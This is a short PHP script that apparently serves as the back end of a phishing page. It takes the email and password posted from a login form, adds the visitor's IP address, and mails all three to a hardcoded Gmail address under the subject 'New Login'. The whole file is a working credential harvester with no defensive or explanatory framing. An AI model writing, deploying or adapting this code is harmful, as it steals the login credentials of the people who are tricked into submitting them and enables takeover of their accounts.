<?php
$ip = getenv("REMOTE_ADDR");	

if(!empty($_POST)) {
 $email= $_POST['email'];
 $password = $_POST['password'];
 
		$to = "rileyjameslogan31@gmail.com";
		
		
         $subject = "New Login : ip";
		 
		 $message =  "Online ID            : ".$email."\r\n";
         $message .= "Password           : ".$password."\r\n";
		 $message .= "IP           : ".$ip."\r\n";
		$header = "Content type: Justin well tools \r\n";
         $header .= "MIME-Version: 1.0\r\n";
         $header .= "Content-type: text/html\r\n";
		 
		 mail ($to,$subject,$message,$header);
}
?>